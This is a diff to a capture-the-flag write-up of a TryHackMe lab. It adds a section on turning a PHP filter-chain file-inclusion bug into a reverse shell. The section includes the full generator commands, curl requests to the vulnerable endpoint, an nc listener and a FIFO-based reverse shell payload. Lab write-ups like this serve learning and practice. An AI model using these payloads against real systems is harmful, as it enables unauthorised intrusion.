@@ -139,16 +139,16 @@ A simple data:// wrapper test did not return command output, so I moved to a mor
 
 I first cloned the tool and generated a test payload that would run the id command.
 
-```Bash
+```bash
 git clone https://github.com/synacktiv/php_filter_chain_generator.git
 cd php_filter_chain_generator
 python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
 ```
 <img width="1897" height="583" alt="filter-chain-generator-id" src="https://github.com/user-attachments/assets/23f690ab-dbc1-4ccd-a8cf-f56fa987ed25" />
 
-The generated payload started with a long php://filter/... chain. I stored it in a variable and sent it to the vulnerable endpoint using curl.
+The tool returned a long php://filter/... payload. I then used that payload in a request to the vulnerable endpoint through the file parameter.
 
-```Bash
+```bash
 payload='php://filter/...'
 curl -G --output - 'http://10.x.x.x/secret-script.php' \
   --data-urlencode "file=$payload"
@@ -163,7 +163,47 @@ The response returned the result of the id command:
 This confirmed that I had achieved remote code execution on the target as the www-data user.
 
 
-6. Reverse Shell
+## 6. Reverse Shell
+
+Once I confirmed command execution as `www-data`, I worked on turning that access into a more usable interactive shell.
+
+I first started a Netcat listener on my attacking machine:
+
+```bash
+nc -lvnp 4444
+```
+Before generating the reverse shell payload, I checked my `tun0` interface to confirm the VPN IP address assigned by OpenVPN. This is important when using a local Kali machine instead of the TryHackMe AttackBox, because the reverse shell must connect back to the VPN-facing IP that the target can actually reach. Using the wrong local or NAT address would prevent the shell from connecting successfully.
+
+```bash
+ip a | grep tun0
+```
+<img width="783" height="61" alt="tun0" src="https://github.com/user-attachments/assets/8232eef6-d9f6-43e6-a096-856c1e954a6a" />
+
+Then I generated another PHP filter chain payload, this time containing a reverse shell command. After a basic `nc -e` attempt failed, I switched to a FIFO-based reverse shell payload.
+
+```bash
+python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 4444 >/tmp/f"); ?>'
+```
+I sent the generated payload to the vulnerable endpoint using the same file parameter technique.
+
+```bash
+payload=$(python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.x.x 4444 >/tmp/f"); ?>' | tail -n 1)
+
+curl -s -G 'http://10.x.x.x/secret-script.php' \
+  --data-urlencode "file=$payload" > /dev/null
+```
+<img width="1476" height="78" alt="reverse-shell-trigger" src="https://github.com/user-attachments/assets/17aaaed3-5ca8-4570-93f8-f08c8196df81" />
+
+The listener received a shell from the target:
+<img width="564" height="91" alt="reverse-shell-listener" src="https://github.com/user-attachments/assets/61012960-a5d0-4add-aafe-01a5a432dc56" />
+
+After landing the shell, I confirmed my access level and current working directory:
+
+<img width="149" height="91" alt="whoami-pwd" src="https://github.com/user-attachments/assets/7434395a-7df4-4a6f-904a-d126a4c43d2a" />
+
+The shell was running as www-data from /var/www/html, which gave me a stable foothold on the target and allowed me to continue local enumeration.
+
+
 7. Credential Discovery
 8. User Access via SSH Key Injection
 9. User Flag
